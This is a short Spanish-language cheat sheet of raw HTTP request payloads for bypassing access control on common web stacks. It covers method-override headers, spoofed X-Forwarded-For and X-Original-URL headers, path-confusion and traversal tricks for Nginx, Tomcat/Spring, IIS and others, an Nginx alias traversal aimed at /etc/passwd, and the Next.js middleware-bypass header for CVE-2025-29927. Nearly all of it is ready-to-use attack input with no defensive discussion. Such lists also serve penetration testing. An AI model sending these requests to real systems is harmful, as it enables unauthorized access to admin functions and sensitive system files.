# 🦕 Access Control Bypass.

**`⃤⃞⃟⃤`** Stack Generico.
```bash
# Usualmente van por POST y el DELETE se puede cambiar por otros metodos.
POST /recurso HTTP/1.1
X-HTTP-Method-Override: DELETE
-----------------------------------
POST /recurso HTTP/1.1
Content-Type: application/x-www-form-urlencoded

_method=DELETE
-----------------------------------
POST /recurso?_method=DELETE HTTP/1.1
------------------------------------
# Headers.
GET /admin HTTP/1.1
X-Forwarded-For: 127.0.0.1
------------------------------------
GET / HTTP/1.1
X-Original-URL: /admin
------------------------------------
# Confusion.
GET /admin%23/../public HTTP/1.1
GET /admin%3f.json HTTP/1.1
GET /login/../dashboard
GET /api/admin/users/ HTTP/1.1 
GET /api/public/../admin/users HTTP/1.1
```
**`⃤⃞⃟⃤`** Nginx + Node/Express.
```bash
GET /admin/ HTTP/1.1
GET /admin%2f HTTP/1.1
GET /public/%2e%2e/admin HTTP/1.1
------------------------------------
# Nginx alias traversal.
GET /static../ HTTP/1.1
GET /static../etc/passwd HTTP/1.1
```
**`⃤⃞⃟⃤`** Apache + PHP.
```bash
# Windows
GET /ADMIN HTTP/1.1
-----------------------------------
# Laravel/Symfony con override.
POST /recurso HTTP/1.1

_method=DELETE
```
**`⃤⃞⃟⃤`** Tomcat / Spring Boot.
```bash
GET /..;/admin HTTP/1.1
GET /admin;jsessionid=abc123 HTTP/1.1
GET /admin/..;/admin HTTP/1.1
GET /public/..;/admin HTTP/1.1
GET /admin/ HTTP/1.1
```
**`⃤⃞⃟⃤`** Django / Flask.
```bash
GET /admin/ HTTP/1.1
```
**`⃤⃞⃟⃤`** Next.js middleware bypass (CVE-2025-29927).
```bash
# Versiones (11.1.4–13.5.6, 14.0–14.2.24, 15.0–15.2.2).
GET /admin HTTP/1.1
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```
**`⃤⃞⃟⃤`** IIS / ASP.NET.
```bash
GET /ADMIN HTTP/1.1
GET /admin/ HTTP/1.1
GET /admin\..\secret HTTP/1.1
GET /admin%5c..%5csecret HTTP/1.1
GET /admin. HTTP/1.1
```
